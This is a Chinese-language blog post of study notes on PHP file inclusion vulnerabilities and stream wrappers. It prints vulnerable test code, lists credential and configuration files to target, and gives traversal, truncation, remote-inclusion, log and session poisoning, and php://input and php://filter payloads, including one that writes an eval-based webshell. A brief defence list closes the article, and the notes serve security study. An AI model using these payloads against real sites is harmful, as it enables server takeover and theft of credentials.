<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>文件包含漏洞和伪协议学习总结 | smallwolf</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="前言随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。文件包含漏洞往往会与其他漏洞一同作用，对我们的web安全造成严重的威胁">
<meta property="og:type" content="article">
<meta property="og:title" content="文件包含漏洞和伪协议学习总结">
<meta property="og:url" content="http://example.com/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="smallwolf">
<meta property="og:description" content="前言随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。文件包含漏洞往往会与其他漏洞一同作用，对我们的web安全造成严重的威胁">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-01-09T14:05:25.000Z">
<meta property="article:modified_time" content="2021-01-17T15:51:29.727Z">
<meta property="article:author" content="Tang zhen">
<meta property="article:tag" content="文件包含漏洞">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="smallwolf" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">smallwolf</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-文件包含漏洞和伪协议学习总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2021-01-09T14:05:25.000Z" itemprop="datePublished">2021-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      文件包含漏洞和伪协议学习总结
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。文件包含漏洞往往会与其他漏洞一同作用，对我们的web安全造成严重的威胁</p>
<a id="more"></a>

<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>文件包含函数加载的参数没有进行过滤或严格的定义，可以被用户控制，包含了一些恶意文件。</p>
<p><strong>常见的文件包含函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()：执行到<span class="keyword">include</span>时才包含文件，找不到被包含的文件时只会产生警告，脚本将继续执行</span><br><span class="line"><span class="keyword">require</span>()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</span><br><span class="line"><span class="keyword">include_once</span>()和<span class="keyword">require_once</span>()：若文件中代码已被包含则不会再次包含</span><br></pre></td></tr></table></figure>

<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>在某一个页面中，一个<strong>变量</strong>的值等于一个页面文件或者是一个固定的值，比如?page=a.asp、?home=b.html、?file=content</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li>web应用采用include等文件包含函数，并且需要包含的文件路径是通过用户传输参数的方式引入</li>
<li>用户能够控制包含文件的参数，被包含的文件可被当前页面访问</li>
</ol>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><ul>
<li><p>上传图片马，包含图片马getshell</p>
<p><strong>图片马制作</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.png/b + phpinfo.php <span class="number">213</span>.jpg</span><br><span class="line">其中phpinfo.php可以为一句话木马,i.png为普通图片（图片尽量简单）</span><br></pre></td></tr></table></figure>
</li>
<li><p>读取网站源码以及配置文件</p>
<p><strong>常见敏感目录</strong></p>
<p>linux</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini // PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/etc/my.conf // mysql 配置文件</span><br></pre></td></tr></table></figure>

<p>windows</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">boot.ini</span> // 查看系统版本</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">inetsrv</span>\<span class="title">MetaBase.xml</span> // <span class="title">IIS</span>配置文件</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">repair</span>\<span class="title">sam</span> // 存储<span class="title">Windows</span>系统初次安装的密码</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">ProgramFiles</span>\<span class="title">mysql</span>\<span class="title">my.ini</span> // <span class="title">MySQL</span>配置</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">ProgramFiles</span>\<span class="title">mysql</span>\<span class="title">data</span>\<span class="title">mysql</span>\<span class="title">user.MYD</span> // <span class="title">MySQL</span> <span class="title">root</span>密码</span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">php.ini</span> // <span class="title">php</span> 配置信息</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>包含日志文件getshell</p>
<h5 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h5><p>当我们的目标站点没有上传功能并且也不能远程文件包含时，我们就可以考虑包含日志文件或者其它可以记录客户端输入的文件。</p>
<p><strong>原理</strong></p>
<p>当我们访问网站时，服务器日志会记录我们的行为，当我们的访问链接中含义恶意代码时，也会被记录到日志中，从而通过包含日志可以进行getshell。</p>
<p><strong>默认日志存放路径</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> 一）日志默认路径</span><br><span class="line">(<span class="number">1</span>) apache+Linux日志默认路径</span><br><span class="line">         /etc/httpd/logs/access_log  或者 /var/log/httpd/access_log</span><br><span class="line">  </span><br><span class="line">(<span class="number">2</span>) apache+win2003日志默认路径</span><br><span class="line"><span class="function">         D:\<span class="title">xampp</span>\<span class="title">apache</span>\<span class="title">logs</span>\<span class="title">access.log</span></span></span><br><span class="line"><span class="function">         <span class="title">D</span>:\<span class="title">xampp</span>\<span class="title">apache</span>\<span class="title">logs</span>\<span class="title">error.log</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">(3) <span class="title">IIS6</span>.0+<span class="title">win2003</span>默认日志文件</span></span><br><span class="line"><span class="function">         <span class="title">C</span>:\<span class="title">WINDOWS</span>\<span class="title">system32</span>\<span class="title">Logfiles</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">(4) <span class="title">IIS7</span>.0+<span class="title">win2003</span> 默认日志文件</span></span><br><span class="line"><span class="function">         %<span class="title">SystemDrive</span>%\<span class="title">inetpub</span>\<span class="title">logs</span>\<span class="title">LogFiles</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">(5) <span class="title">nginx</span> 日志文件</span></span><br><span class="line"><span class="function">         日志文件在用户安装目录<span class="title">logs</span>目录下</span></span><br><span class="line"><span class="function">                 以我的安装路径为例/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">nginx</span>,</span></span><br><span class="line"><span class="function">                 那我的日志目录就是在/<span class="title">usr</span>/<span class="title">local</span>/<span class="title">nginx</span>/<span class="title">logs</span>里</span></span><br><span class="line"><span class="function"> +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="function"> 二）<span class="title">web</span>中间件默认配置</span></span><br><span class="line"><span class="function">   </span></span><br><span class="line"><span class="function">(1) <span class="title">apache</span>+<span class="title">linux</span> 默认配置文件</span></span><br><span class="line"><span class="function">         /<span class="title">etc</span>/<span class="title">httpd</span>/<span class="title">conf</span>/<span class="title">httpd.conf</span> 或者  <span class="title">index.php</span>?<span class="title">page</span>=/<span class="title">etc</span>/<span class="title">init.d</span>/<span class="title">httpd</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">(2) <span class="title">IIS6</span>.0+<span class="title">win2003</span> 配置文件</span></span><br><span class="line"><span class="function">         <span class="title">C</span>:/<span class="title">Windows</span>/<span class="title">system32</span>/<span class="title">inetsrv</span>/<span class="title">metabase.xml</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">(3) <span class="title">IIS7</span>.0+<span class="title">WIN</span> 配置文件</span></span><br><span class="line"><span class="function">         <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">inetsrv</span>\<span class="title">config</span>\<span class="title">applicationHost.config</span></span></span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong></p>
<ul>
<li>日志存放路径的获取</li>
<li>存在文件包含漏洞</li>
<li>curl命令行url请求工具或者burp代理（避免url编码的干扰）</li>
</ul>
</li>
<li><p>包含session文件</p>
<p><strong>利用手段</strong></p>
<ol>
<li><p>通过phpinfo 的信息获取到session的存储位置</p>
</li>
<li><p>通过猜测默认的session存放位置进行尝试</p>
<p>如linux下默认存储在/var/lib/php/session目录下</p>
<p>session中的内容可以被控制，传入恶意代码。</p>
</li>
</ol>
<p>​    示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs=$_GET[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;username&quot;</span>]=$ctfs;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此php会将获取到的GET型ctfs变量的值存入到session中。</p>
<p>当访问<a target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs</a> 后，会在/var/lib/php/session目录下存储session的值。</p>
<p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取。</p>
<p><strong>漏洞利用</strong></p>
<p>当访问<a target="_blank" rel="noopener" href="http://www.ctfs-wiki/session.php?ctfs=">http://www.ctfs-wiki/session.php?ctfs=</a><?php phpinfo();?>后，会在/var/lib/php/session目录下存储session的值。</p>
<p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。</p>
</li>
</ul>
<h5 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h5><h6 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h6><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>

<h6 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h6><p>条件：windows OS，点号需要长于256;linux OS长于4096</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/././.......省略若干</span><br></pre></td></tr></table></figure>

<h6 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h6><p>条件：windows OS，点号需要长于256</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ctfs-wiki.com&#x2F;FI&#x2F;FI.php</span><br><span class="line">?filename&#x3D;test.txt....................省略若干点</span><br></pre></td></tr></table></figure>

<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><ol>
<li>需要<code>php.ini</code>中<code>allow_url_include = on</code>以及<code>allow_url_fopen=on</code></li>
<li>所包含远程服务器的文件后缀不能与目标服务器语言相同。(比如目标服务器是php脚本语言解析的，那么包含的远程服务器文件后缀不能是<code>php</code>)</li>
</ol>
<h5 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h5><p>测试代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure>

<h6 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ctfs-wiki.com&#x2F;FI&#x2F;WFI.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%23</span><br></pre></td></tr></table></figure>

<h6 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ctfs-wiki.com&#x2F;FI&#x2F;WFI.php?filename&#x3D;http:&#x2F;&#x2F;192.168.91.133&#x2F;FI&#x2F;php.txt%20</span><br></pre></td></tr></table></figure>

<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>
<li>过滤.（点）/（反斜杠）\（反斜杠）</li>
<li>禁止服务器远程文件包含</li>
</ol>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><ol>
<li><p>php://input</p>
<p><strong>利用原理</strong></p>
<p>php://input可以访问请求的原始数据的只读流,将post请求的数据当作php代码执行，如果存在文件包含漏洞,可将php://input作为文件名传入,同时在post中注入设置想要注入的代码,php执行时就会将post的内容作为php代码执行。</p>
<p><strong>利用条件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen：off/on</span><br><span class="line"></span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p><strong>利用语句</strong></p>
<ol>
<li><p>执行任意代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"> post数据: <span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>写入木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line"> post数据: <span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>读取目录结构</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//inputpost数据:</span></span><br><span class="line"> post数据:</span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;print_r(scandir(<span class="string">&#x27;E:/&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>data://</p>
<p>跟input协议差不多，指定data是get方法，而input是post方法</p>
</li>
<li><p>phar://</p>
<p><strong>利用条件</strong></p>
<p>php&gt;=5.3.0</p>
<p><strong>利用语句</strong></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php?f=phar://attack.txt%EF%BC%8Cattack.txt%E5%8F%AF%E5%86%99%E5%85%A5php%E4%BB%A3%E7%A0%81">http://127.0.0.1/flag.php?f=phar://attack.txt，attack.txt可写入php代码</a></p>
</li>
<li><p>zip://</p>
<p><strong>利用条件</strong></p>
<p>php&gt;=5.3.0，在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以，需要指定绝对路径</p>
<p><strong>利用语句</strong></p>
<p>zip://attect.zip#dir/file.txt,file.txt</p>
</li>
<li><p>php://filter</p>
<p><strong>利用原理</strong></p>
<p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件行。如果我们对其进行编码，就可以任意文件读取。</p>
<p><strong>利用语句</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line"> 或</span><br><span class="line"> ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br><span class="line"> 或</span><br><span class="line"> ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php #可绕过过滤了操作名read的waf</span><br><span class="line"> 或</span><br><span class="line"> ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php #可用重写resource绕过正则为&quot;&#x2F;resource&#x3D;*.jpg&#x2F;i&quot;的waf</span><br></pre></td></tr></table></figure>

</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" data-id="ckkctkjfq0005w4ujfkc8gjcj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">文件包含漏洞</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/01/14/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          SSTI模板注入漏洞总结
        
      </div>
    </a>
  
  
    <a href="/2021/01/06/python30%E5%A4%A9%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Python30天学习笔记</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">SSTI模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" rel="tag">命令执行漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%AC%E8%99%AB/" rel="tag">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SSTI模板注入</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">命令执行漏洞</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件上传漏洞</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 10px;">正则表达式</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 10px;">爬虫</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 20px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/01/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">命令执行漏洞总结</a>
          </li>
        
          <li>
            <a href="/2021/01/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">正则表达式学习笔记</a>
          </li>
        
          <li>
            <a href="/2021/01/14/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSTI模板注入漏洞总结</a>
          </li>
        
          <li>
            <a href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">文件包含漏洞和伪协议学习总结</a>
          </li>
        
          <li>
